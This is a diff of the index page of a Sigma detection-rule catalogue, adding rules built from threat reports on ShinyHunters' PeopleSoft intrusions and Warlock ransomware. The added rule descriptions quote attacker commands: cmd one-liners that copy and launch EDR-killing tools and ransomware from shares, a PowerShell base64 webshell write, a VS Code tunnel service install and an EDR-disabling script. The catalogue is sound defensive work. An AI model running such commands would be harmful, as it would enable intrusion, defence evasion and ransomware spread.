@@ -4,9 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>eeps-sigma · Sigma detections from primary threat research</title>
-<meta name="description" content="25 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta name="description" content="34 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta property="og:title" content="eeps-sigma · Sigma detections from primary threat research">
-<meta property="og:description" content="25 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta property="og:description" content="34 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta name="author" content="Esmond Er">
 <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -41,10 +41,10 @@
     </div>
     
     <dl class="stats">
-      <div><dt>Published rules</dt><dd>25</dd></div>
-      <div><dt>ATT&amp;CK techniques</dt><dd>28</dd></div>
+      <div><dt>Published rules</dt><dd>34</dd></div>
+      <div><dt>ATT&amp;CK techniques</dt><dd>30</dd></div>
       <div><dt>Platforms</dt><dd>4</dd></div>
-      <div><dt>Last updated</dt><dd class="dd-date">2026-10-02</dd></div>
+      <div><dt>Last updated</dt><dd class="dd-date">2026-10-04</dd></div>
     </dl>
   </div>
 </section>
@@ -84,7 +84,7 @@
   <div class="wrap">
     <h2>ATT&amp;CK coverage</h2>
     <p class="muted">Published rules by tactic, current ATT&amp;CK Enterprise release.</p>
-    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:67%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:83%"></i></span><span class="t-n">5</span></li><li class="on"><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Stealth</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">6</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:50%"></i></span><span class="t-n">3</span></li><li class=""><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Collection</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">6</span></li><li class=""><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">2</span></li></ul>
+    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:22%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:56%"></i></span><span class="t-n">5</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">9</span></li><li class="on"><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:11%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Stealth</span><span class="t-bar"><i style="width:78%"></i></span><span class="t-n">7</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:44%"></i></span><span class="t-n">4</span></li><li class=""><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:22%"></i></span><span class="t-n">2</span></li><li class="on"><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">3</span></li><li class="on"><span class="t-name">Collection</span><span class="t-bar"><i style="width:11%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:89%"></i></span><span class="t-n">8</span></li><li class=""><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:22%"></i></span><span class="t-n">2</span></li></ul>
   </div>
 </section>
 
@@ -99,6 +99,16 @@
   <div class="rule-list" data-rule-list>
     <div class="rule-row rule-head" aria-hidden="true"><span>Rule</span><span class="rr-tech">ATT&amp;CK</span><span>Level</span><span class="rr-date">Updated</span></div>
     
+      <a class="rule-row" href="rules/file_event_lnx_peoplesoft_war_directory_jsp_write.html" data-level="high" data-product="linux"
+         data-search="jsp file written to oracle peoplesoft web application archive directory - linux t1505.003 file_event detects creation of jsp or jspx files inside the peoplesoft psemhub.war or portal.war web application directories on linux (&lt;ps_cfg_home&gt;/webserv/&lt;domain&gt;/applications/peoplesoft/psemhub.war/). unc6240 (shinyhunters) exploited psemhub (cve-2026-35273), wrote web shells (x.jsp, u.jsp and sequentially numbered jsps) and other unexpected files such as tunnel.jsp and tunnel.jspx into psemhub.war. sekoia also reports shinyhunters &quot;deploying small jsp backdoors on compromised peoplesoft servers to maintain persistence&quot; (orau.jsp, webpack.jsp), without giving their directory.">
+        <span class="rr-main">
+          <span class="rr-title">JSP File Written To Oracle PeopleSoft Web Application Archive Directory - Linux</span>
+          <span class="rr-sub">Linux · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_lnx_meshagent_execution_from_tmp.html" data-level="high" data-product="linux"
          data-search="meshagent executed from temporary directory - linux t1219 process_creation detects the meshcentral agent (meshagent) running from a world-writable temporary directory on linux. unc6240 (shinyhunters) dropped unencrypted meshagent binaries and configuration (meshagent, meshagent.msh, meshagent.db) directly into /tmp under the peoplesoft service account and used it as a remote access channel to microsoft-masquerading domains. legitimate meshcentral installs run from an installation directory such as /usr/local/mesh_services/, not /tmp.">
         <span class="rr-main">
@@ -169,6 +179,16 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-26</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_win_cmd_copy_from_share_to_users_public_and_start_background.html" data-level="high" data-product="windows"
+         data-search="cmd copies files from network share to users public and starts them in background t1570 t1059.003 process_creation detects a cmd.exe one-liner that copies files from a unc share and then launches an executable from c:\users\public with start /b cmd /c &quot;... 2&gt;nul || exit&quot;. symantec reports that the warlock ransomware attackers pushed an av/edr-killing tool with net use \\[ip_address] ... &amp; copy \\[ip_address]\av\* csidl_profile\public /y &amp; start /b cmd /c &quot;c:\users\public\a.exe log 2&gt;nul || exit&quot; and deployed the ransomware with copy \\[removed]\sysvol\[victim domain]\scripts\run\* csidl_profile\public /y &amp; start /b cmd /c &quot;c:\users\public\run.exe 2&gt;nul || exit&quot;.">
+        <span class="rr-main">
+          <span class="rr-title">Cmd Copies Files From Network Share To Users Public And Starts Them In Background</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1570</span> <span class="chip">T1059.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
       <a class="rule-row" href="rules/image_load_sideeye_ev_signer.html" data-level="high" data-product="windows"
          data-search="image signed with certificate abused by sideeye loader t1553.002 image_load detects loading of an image signed with the extended validation certificate issued to &quot;tobias weihmann software development ou&quot; (via sectigo). unc6240 (shinyhunters) deployed ple64.exe, a trojanized installer masquerading as light alloy that delivers the sideeye backdoor, signed with this certificate. artifact-level indicator: it stops being useful once the certificate is revoked (gtig requested revocation) or the actor re-signs. uses the sysmon event id 7 signature field; process_creation logs do not carry signer data.">
         <span class="rr-main">
@@ -219,6 +239,16 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-01</span>
       </a>
+      <a class="rule-row" href="rules/proc_creation_win_powershell_writeallbytes_base64_aspx_to_sharepoint_layouts.html" data-level="high" data-product="windows"
+         data-search="powershell writes base64-decoded aspx file to sharepoint layouts directory t1505.003 process_creation detects a powershell command line that decodes base64 content with frombase64string and writes it with writeallbytes to an .aspx file under a sharepoint template\layouts directory. symantec reports that after toolshell exploitation the warlock ransomware attackers installed a webshell on a sharepoint server with powershell -nop -c &quot;[io.file]::writeallbytes(&#x27;...\microsoft shared\web server extensions\14\template\layouts\layout2sp.aspx&#x27;,[convert]::frombase64string(...&quot;. the rule matches any sharepoint version folder; the observed write targeted the \14\ hive, which the sigmahq layouts file-write rules (\15\ and \16\ only) do not cover.">
+        <span class="rr-main">
+          <span class="rr-title">PowerShell Writes Base64-Decoded ASPX File To SharePoint Layouts Directory</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_python_client_py_from_users_public_indigo.html" data-level="high" data-product="windows"
          data-search="python tunneling implant client.py executed from users public indigo folder t1572 process_creation detects a process whose image is located in \users\public\indigo\ and whose command line references client.py. sophos x-ops reports that in the stac4924 campaign (terminalfix lures leading to lorem ipsum loader) the malware deployed a portable python runtime to the users\public\indigo directory by downloading the legitimate python embedded package from python.org, and the runtime was used to execute client.py, a custom tunneling implant that opens an encrypted websocket connection to attacker-controlled servers to relay traffic into the network. the report does not name the python executable, so the rule keys on the folder and script name. sophos tracks the campaign as stac4924 and assesses with moderate confidence that its two phases are linked to the same threat group or to closely associated threat actors.">
         <span class="rr-main">
@@ -238,6 +268,36 @@
         <span class="rr-tech"><span class="chip">T1547.001</span> <span class="chip">T1218</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/win_security_scheduled_task_meshfwfix_created.html" data-level="high" data-product="windows"
+         data-search="scheduled task meshfwfix created t1053.005 security detects creation (security event 4698) of a scheduled task whose name contains meshfwfix. sekoia&#x27;s hunting query for the shinyhunters meshcentral/meshagent deployment looks for scheduled-task creation events (event code 4698) where the task name contains &quot;meshfwfix&quot;. the task name is an attacker-chosen artifact; requires &quot;audit other object access events&quot; to be enabled.">
+        <span class="rr-main">
+          <span class="rr-title">Scheduled Task MeshFwFix Created</span>
+          <span class="rr-sub">Windows · security</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1053.005</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_script_executed_from_windows_temp_bea_cache.html" data-level="high" data-product="windows"
+         data-search="script executed from windows temp .bea-cache folder t1685 process_creation detects a process command line referencing the c:\windows\temp\.bea-cache\ folder or the cs_disable.cmd script. sekoia reports that during the shinyhunters oracle peoplesoft campaign &quot;attacks against security tools also included a small windows script that disables crowdstrike edr&quot;, hunted for as file path c:\windows\temp\.bea-cache\cs_disable.cmd or a command line containing cs_disable.cmd. the folder and script names are attacker-chosen artifacts and are trivially changed.">
+        <span class="rr-main">
+          <span class="rr-title">Script Executed From Windows Temp .bea-cache Folder</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1685</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_win_peoplesoft_war_directory_suspicious_file_write.html" data-level="high" data-product="windows"
+         data-search="suspicious file written to oracle peoplesoft web application archive directory - windows t1505.003 t1105 file_event detects creation of jsp, jspx or exe files inside the peoplesoft psemhub.war or portal.war web application directories. unc6240 (shinyhunters) exploited psemhub (cve-2026-35273), wrote web shells (x.jsp, u.jsp and sequentially numbered jsps) and other unexpected files such as tunnel.jsp and tunnel.jspx into psemhub.war, then uploaded ple64.exe, a trojanized installer delivering the sideeye backdoor, in chunks through u.jsp and reassembled it in the same directory. the report does not name the process that writes these files, so the rule does not filter on image. sekoia also reports shinyhunters &quot;deploying small jsp backdoors on compromised peoplesoft servers to maintain persistence&quot; (orau.jsp, webpack.jsp), without giving their directory.">
+        <span class="rr-main">
+          <span class="rr-title">Suspicious File Written To Oracle PeopleSoft Web Application Archive Directory - Windows</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505.003</span> <span class="chip">T1105</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-04</span>
       </a>
       <a class="rule-row" href="rules/image_load_win_cotfilereadapp_unsigned_ceiinfolog_dll_load.html" data-level="high" data-product="windows"
          data-search="unsigned ceiinfolog.dll loaded by canon cotfilereadapp.exe t1574.001 image_load detects the canon-signed cotfilereadapp.exe loading an unsigned ceiinfolog.dll, a dll sideloading pattern. huntress reports an unattributed clickfix campaign (lures delivered through a malicious chatgpt custom gpt) in which an msi installed cotfilereadapp.exe into %localappdata%\programs\advanced printer configuration reader\ next to a malicious ceiinfolog.dll; the payload was a remote access trojan that the report does not name. huntress lists &quot;an unsigned ceiinfolog.dll ... in the same folder as cotfilereadapp.exe&quot; as an indicator. the rule keys on the signature status reported by sysmon eid 7 and does not depend on the actor-chosen install folder. the later v2 variant moved to a different signed host (stardock deelevate64.exe) and is not covered.">
@@ -309,6 +369,26 @@
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-02</span>
       </a>
+      <a class="rule-row" href="rules/file_event_win_executable_or_dll_tmp_created_in_system32_0409.html" data-level="medium" data-product="windows"
+         data-search="executable or staged dll created in system32 0409 folder t1574.001 file_event detects creation of an .exe or .dll.tmp file in the system32\0409 subfolder. symantec reports that the warlock ransomware attackers deployed ssvagent.exe and logger.exe &quot;in a subdirectory of the windows system folder (csidl_system\0409\)&quot; alongside the dlls gsdll64.dll.tmp and doexeloc.dll.tmp for dll side-loading, before copying them into programdata. csidl_system is symantec&#x27;s placeholder for the windows system folder (system32). the rule keys on the folder rather than the file names, which are trivially changed. writes by windows servicing (tiworker.exe, trustedinstaller.exe) and windows installer (msiexec.exe) are filtered out.">
+        <span class="rr-main">
+          <span class="rr-title">Executable Or Staged DLL Created In System32 0409 Folder</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1574.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_win_dfsrs_executable_written_to_sysvol_scripts.html" data-level="medium" data-product="windows"
+         data-search="executable written to sysvol scripts folder by dfs replication service t1570 file_event detects the dfs replication service (dfsrs.exe) writing an executable under the sysvol\domain\scripts folder on a domain controller. symantec reports that the warlock ransomware attackers staged run.exe and rune.exe in sysvol\domain\scripts\run, and that telemetry recorded dfsrs.exe, &quot;the process responsible for replicating sysvol between domain controllers&quot;, as the parent that delivered run.exe and rune.exe, confirming the payload spread via ordinary sysvol replication. dfsr may first write replicated files into its dfsrprivate staging folders, so coverage depends on how the edr attributes the final file write.">
+        <span class="rr-main">
+          <span class="rr-title">Executable Written To SYSVOL Scripts Folder By DFS Replication Service</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1570</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-04</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_findstr_payment_card_data_search.html" data-level="medium" data-product="windows"
          data-search="findstr search for payment card data fields t1005 process_creation detects findstr.exe run with payment card field names (cvv, cardnumber, creditcard, ccnumber, card_number, first_six, last_four) as search strings. through aspx webshells on iis servers of a recreation management platform, the attacker searched web application source and payment webhook logs for cardholder data, e.g. findstr /s /i /m /c:&quot;cvv&quot; /c:&quot;cardnumber&quot; /c:&quot;creditcard&quot; /c:&quot;ccnumber&quot; ... e:\content\info\*.aspx and findstr /i &quot;exp_date exp_month exp_year expiration cvv first_six last_four card_number&quot; e:\content\info\_fortis\webhooks\&lt;date&gt;.txt.">
         <span class="rr-main">
@@ -318,6 +398,16 @@
         <span class="rr-tech"><span class="chip">T1005</span></span>
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-10-02</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_vscode_tunnel_service_install_command.html" data-level="medium" data-product="windows"
+         data-search="visual studio code tunnel installed as a service via command line t1219.001 process_creation detects the visual studio code cli installing its remote tunnel as a windows service (&quot;tunnel service install&quot;). symantec reports that the warlock ransomware attackers used visual studio code&#x27;s built-in tunnel feature for persistence and remote access, running &quot;csidl_windows\debug\code-insiders.exe&quot; tunnel service install --accept-server-license-terms from the windows\debug folder. the sigmahq vs code tunnel rules match &#x27;.exe tunnel&#x27; (missed when the image path is quoted) or the later &#x27;internal-run&#x27; service execution, not the install command itself. a code-insiders.exe or code.exe image outside a normal vs code install location (such as c:\windows\debug\) should be treated as highly suspicious.">
+        <span class="rr-main">
+          <span class="rr-title">Visual Studio Code Tunnel Installed As A Service Via Command Line</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1219.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-04</span>
       </a>
       <a class="rule-row" href="rules/azure_storage_account_deleted.html" data-level="low" data-product="azure"
          data-search="azure storage account deleted t1485 t1490 activitylogs detects deletion attempts of azure storage accounts. this is a base rule for threshold alerting. storm-3168 used a compromised service principal to make 100+ storage account deletion attempts in a destructive sequence lasting about 7 minutes; most targeted storage accounts were deleted, and deletion attempts were also made against azure site recovery and azure backup protection locks protecting storage accounts. recommended aggregation: alert when one caller produces deletion attempts against 10+ distinct resourceid values (count success and failure; exclude start/accept events to avoid double counting) within 10 minutes. raise severity when resourceid contains backup, recovery or asr, or when the target is one of the site recovery related storage accounts. the operationname is the standard arm operation for storage account deletion.">
